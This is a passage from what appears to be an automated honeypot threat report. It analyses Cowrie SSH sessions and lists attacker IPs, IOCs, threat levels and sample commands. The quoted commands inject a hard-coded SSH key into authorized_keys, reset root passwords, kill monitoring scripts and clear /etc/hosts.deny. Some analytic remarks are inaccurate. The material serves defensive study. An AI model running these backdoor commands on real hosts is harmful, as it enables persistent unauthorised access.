**Indicators of Compromise (IOCs):**  
- Attacker IP: **81.192.46.35**  
- RSA public key string in the authorized_keys file (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- File path: `~/.ssh/authorized_keys`.  
- Commands executed (e.g., `crontab -l`, `uname -a`).

**Threat Level:** **Medium** – moderate sophistication, potential for remote control and further exploitation.  

**Brief Summary:** The attacker injected an SSH key to establish a backdoor while collecting system information, indicating a moderate threat that could enable future remote attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "light\nMEhHW2X7Fe6J\nMEhHW2X7Fe6J"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "light\nMEhHW2X7Fe6J\nMEhHW2X7Fe6J\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: ecfbcccd54f5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.207.18.113

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the host by adding a malicious SSH key and attempting to set a new root password.  
**Techniques:**  
- `mkdir .ssh && echo … > .ssh/authorized_keys` – injects an RSA public key into authorized_keys.  
- `chmod -R go= ~/.ssh` – restricts permissions on the SSH directory.  
- Attempts to change the root password using `passwd`.  
- System reconnaissance commands (`cpuinfo`, `free`, `uname`, `whoami`, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- IP: **172.207.18.113** (Japan)  
- SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "root123\nyjVIwOMIvCAy\nyjVIwOMIvCAy"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "root123\nyjVIwOMIvCAy\nyjVIwOMIvCAy\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 0bc3ef3176fb...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.160.212.122

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with possible credential manipulation and system reconnaissance  
**Objective:** Gain remote access to the host by creating an authorized SSH key and potentially establishing a privileged user; gather machine details for future exploitation or profiling.  
**Techniques:**  
- `chattr -ia` / `lockr -ia` to make `.ssh` immutable, hiding it from normal operations.  
- Removal of existing `.ssh`, creation of new directory, injection of a random RSA key into `authorized_keys`.  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict group access.  
- Attempted password change via piping `passwd` into `bash` (likely to create or modify user credentials).  
- System information gathering: CPU info, memory usage, OS details, disk space, and cron jobs.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 103.160.212.122 (Indonesia)  
- RSA key string in `authorized_keys` (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`) – can be hashed for detection.  
- File path `.ssh/authorized_keys`.  

**Threat Level:** Medium – the attacker successfully installs a backdoor and attempts to elevate privileges, but no evidence of malware download or cryptomining.  

**Brief Summary:** The session shows an attacker injecting a new SSH key into `authorized_keys`, making the directory immutable, attempting to change user passwords, and collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin@123\nwtkxSY8U7pok\nwtkxSY8U7pok"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "admin@123\nwtkxSY8U7pok\nwtkxSY8U7pok\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 4eafc1f7764c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.173

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote root access to the system by creating a new authorized‑keys entry and resetting the user password.  

**Techniques & Tools Used:**  
- `chattr`, `lockr` – attempt to lock file attributes (likely to evade detection).  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` – restrict permissions on the SSH directory.  
- Multiple `passwd` commands to set a new password (`root123`).  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `uname`, `whoami`, etc.) to gather host details.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.143.238.173** (Hong Kong).  
- Hard‑coded RSA public key string in the `authorized_keys` file.  
- File paths: `.ssh/authorized_keys`, `/proc/cpuinfo`.  

**Threat Level:** **High** – attacker successfully installed a backdoor with root privileges, enabling persistent remote control.

**Brief Summary:** The session shows an attacker injecting a malicious SSH key and resetting the user password to gain root access, while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "root123\nzHaeF0xGgUKK\nzHaeF0xGgUKK"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "root123\nzHaeF0xGgUKK\nzHaeF0xGgUKK\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: b6c235e5c320...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.207.18.113

#### Analysis

**Attack Type:** Backdoor installation (SSH credential theft)

**Objective:** Gain remote access to the system with full administrative privileges by injecting an SSH public key and resetting the root password.

**Techniques & Tools Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`)
- Injection of a malicious SSH key into `authorized_keys`
- Root password reset via `chpasswd`
- Process termination (`pkill -9`) to hide activity
- System information gathering (CPU, memory, uptime) for reconnaissance

**Indicators of Compromise (IOCs):**
- Attacker IP: **172.207.18.113**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- Root password hash (not visible but indicates change)

**Threat Level:** **High** – full administrative access is granted, potential for extensive damage.

**Brief Summary:** The attacker installed a malicious SSH key and reset the root password to establish a persistent backdoor, enabling unrestricted remote control of the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:hwe6DXHtJ44l"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 0292ab7ee3b4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.160.212.122

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection (potential botnet recruitment).  
**Objective:** Gain remote access to the system, possibly to control or use it as a node in a larger network.  
**Techniques:**  
- Immutable file operations (`chattr -ia`, `lockr -ia`) to protect `.ssh`.  
- Removal and recreation of `.ssh` directory.  
- Injection of an RSA public key into `authorized_keys`.  
- Password manipulation via `passwd` (attempts to set new passwords).  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `uname`, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.160.212.122** (Indonesia).  
- RSA public key string in `authorized_keys`.  
- File path `.ssh/authorized_keys`.  
- Password strings “root123” and “Us7ecDz2Oj7i”.  

**Threat Level:** Medium–High – the attacker successfully installed a backdoor and attempted to alter system credentials, indicating potential for further exploitation.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, attempted password changes, and collected system information, likely aiming to establish remote control or recruit the machine as part of a botnet.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "root123\nUs7ecDz2Oj7i\nUs7ecDz2Oj7i"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "root123\nUs7ecDz2Oj7i\nUs7ecDz2Oj7i\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 9707e8dc32de...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.211

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password reset) with reconnaissance  
**Objective:** Gain privileged SSH access to the honeypot and gather system information for future exploitation.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh`;  
- `mkdir .ssh`, `echo … > ~/.ssh/authorized_keys` to inject a public key;  
- `chmod -R go= ~/.ssh` to restrict permissions;  
- `chpasswd` to set root password (`root:L8WCqbkHrxps`);  
- Process killing (`pkill -9 secure.sh`, etc.) to hide activity.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.142.211** (Singapore)  
- Public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: **L8WCqbkHrxps**  
- Empty `/etc/hosts.deny` file created.  
**Threat Level:** **High** – attacker achieved root access and installed a persistent SSH backdoor.  
**Brief Summary:** The attacker injected an SSH key into the honeypot, reset the root password, and performed system reconnaissance to prepare for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:L8WCqbkHrxps"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+9 more)
```

---

### Pattern: d9d2a4cb9083...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.211

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent SSH access (root privileges) on the honeypot.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory,  
- `mkdir .ssh` and echo a public RSA key into `authorized_keys`,  
- `chmod -R go= ~/.ssh` to restrict permissions,  
- `chpasswd` to set root password (`root:PUVw8tWeqOgv`),  
- Process killing (`pkill -9`) and removal of temporary scripts.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.142.211**  
- RSA public key string in `authorized_keys`:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Temporary script names: `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** **High** – root password change and SSH key injection provide full system access.  
**Brief Summary:** The attacker injected an SSH public key into the honeypot’s `authorized_keys` file, changed the root password, and performed cleanup of temporary scripts, effectively establishing a backdoor for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:PUVw8tWeqOgv"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+9 more)
```

---

### Pattern: 8681c1f39ef2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.194.85

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain persistent root‑level access on the target system via SSH and password manipulation.  

**Techniques & Tools Used:**  
- **SSH Key Injection** – `echo … > ~/.ssh/authorized_keys` with a hard‑coded RSA key.  
- **Root Password Change** – `echo "root:WKpklEzoZOCf"|chpasswd|bash`.  
- **Process Hiding / Cleanup** – killing `secure.sh`, `auth.sh`, and `sleep`; clearing `/etc/hosts.deny`.  
- **System Information Gathering** – CPU, memory, architecture, uptime (`uname`, `top`, `lscpu`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 45.78.194.85 (Singapore)  
- Hard‑coded SSH key string (RSA public key).  
- Root password hash “WKpklEzoZOCf”.  

**Threat Level:** **High** – the attacker has achieved root access and installed a persistent backdoor, enabling full control of the system.

**Brief Summary:** The session shows an attacker injecting a hard‑coded SSH key and changing the root password to establish a permanent root‑level backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:WKpklEzoZOCf"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
... (+9 more)
```

---

### Pattern: 5a8e9259959f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.173

#### Analysis

**Attack Type:** Backdoor / Privilege escalation  
**Objective:** Install an unauthorized SSH key and set a new root password to gain persistent access.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory, then overwrite it with a custom authorized_keys file containing a hard‑coded RSA key.  
- `echo "root:O0ZapZy5QMNd"|chpasswd|bash` to change the root password.  
- `pkill -9` and `rm -rf` to terminate or remove suspicious processes (`secure.sh`, `auth.sh`, `sleep`).  
- System‑info gathering commands (`cat /proc/cpuinfo`, `free`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.143.238.173** (Hong Kong)  
- SSH key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **O0ZapZy5QMNd**  

**Threat Level:** High – the attacker successfully installs a persistent backdoor and modifies system credentials, enabling full control.  

**Brief Summary:** The attacker injected an SSH key and changed the root password to establish a permanent backdoor on the target machine, while also gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:O0ZapZy5QMNd"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: adcc10e9d5ce...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 222.107.251.147

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (remote access setup)

**2. Objective:**  
- Install an SSH key for remote control  
- Change the root password to enable privileged access  
- Gather system information to evaluate target

**3. Techniques & Tools Used:**
- `chattr`/`lockr` to lock files  
- Direct echo of a public‑key into `.ssh/authorized_keys`  
- `chmod -R go= ~/.ssh` to restrict permissions  
- `cat /proc/cpuinfo`, `free -m`, `top`, `uname`, `lscpu` for system reconnaissance  
- `pkill -9` to terminate processes (`secure.sh`, `auth.sh`, `sleep`) and modify `/etc/hosts.deny`

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **222.107.251.147**  
- SSH public key string (beginning with `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`)  
- File paths: `.ssh/authorized_keys`, `/etc/hosts.deny`  
- Process names targeted for kill: `secure.sh`, `auth.sh`, `sleep`

**5. Threat Level:** **High** – the attacker has gained root access and installed a persistent backdoor, posing significant risk.

**6. Brief Summary:**  
The attacker injected an SSH key into the honeypot’s authorized_keys file, changed the root password, and executed system‑info commands to assess the environment, effectively establishing a remote backdoor with high potential impact.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:SvNfez0tvI0N"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4cb5eb71fdbc...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 58.69.56.44

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote access to the honeypot and potentially modify local user credentials.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory, then overwrite it with a new authorized‑keys file containing an RSA public key (with a random suffix).  
- Password manipulation attempts (`passwd`) to set or change the “aryan123” user password.  
- System reconnaissance: CPU info, memory usage, disk space, uptime, and user identity.  

**Indicators of Compromise (IOCs):**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8db

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "aryan123\nfHUQcwzUyXnc\nfHUQcwzUyXnc"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "aryan123\nfHUQcwzUyXnc\nfHUQcwzUyXnc\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 4ac1bfab0a07...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.173

#### Analysis

**Attack Type:**  
Backdoor installation with reconnaissance

**Objective:**  
Gain remote SSH access by injecting a malicious public‑key into the host’s `authorized_keys` file and gather system information for later exploitation.

**Techniques & Tools Used:**
- **SSH key injection** – creation of `.ssh/authorized_keys` with a random RSA key.
- **Permission manipulation** – `chmod -R go= ~/.ssh` to restrict access.
- **System reconnaissance** – commands such as `cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, `whoami`, `lscpu`, and `df`.

**Indicators of Compromise (IOCs):**
- The injected RSA public key string (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).
- File path: `/home/.ssh/authorized_keys`.
- Permission change command: `chmod -R go= ~/.ssh`.

**Threat Level:** Medium – the attacker successfully installed a backdoor and collected system data, enabling future remote exploitation.

**Brief Summary:**  
The attacker injected a malicious SSH key into the host’s authorized keys file to establish a backdoor while collecting detailed system information for potential further attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin@123\n49GOBUiMBJLg\n49GOBUiMBJLg"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "admin@123\n49GOBUiMBJLg\n49GOBUiMBJLg\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 82a8f0cd789a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.95.84.172

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain persistent remote control by adding an SSH key and changing the root password.  
**Techniques:**  
- Creation of `.ssh` directory and injection of a public‑key into `authorized_keys`.  
- Permission manipulation (`chmod -R go= ~/.ssh`).  
- Root password change via `chpasswd`.  
- System information gathering (CPU, memory, disk usage, process list).  
- Process termination (`pkill -9`) to remove potential monitoring scripts.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **150.95.84.172**  
- Public‑key string in `authorized_keys` (RSA fingerprint can be derived).  
- Files targeted: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** **High** – root password alteration and SSH key injection provide full remote access, enabling further exploitation.  

**Brief Summary:** The attacker injected an SSH public key into the honeypot’s `authorized_keys` file, changed the root password, and performed extensive system reconnaissance to establish a persistent backdoor.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:CrZROuUWjvLU"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f8f0ac9e459f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.191.157.64

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (potentially for later exploitation).

**Objective:**  
Create a persistent SSH entry on the target machine so that the attacker can log in remotely at any time, while collecting basic system information to assess the host’s capabilities.

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) to secure the key file.
- Injection of a public SSH key into `authorized_keys`.
- System reconnaissance commands (CPU info, memory usage, uptime, user identity, disk space).

**Indicators of Compromise (IOCs):**
- Attacker IP: **172.191.157.64**  
- Public SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`

**Threat Level:** Medium – the attacker demonstrates moderate sophistication by securing SSH access and gathering system data, but no payload download or active exploitation is observed.

**Brief Summary:**  
The attacker injected a malicious SSH key into the target’s `.ssh` directory to establish future remote access while performing basic reconnaissance of the host’s hardware and software.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\n7lyvqYIzJe5I\n7lyvqYIzJe5I"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\n7lyvqYIzJe5I\n7lyvqYIzJe5I\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 78afcb6de5e2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
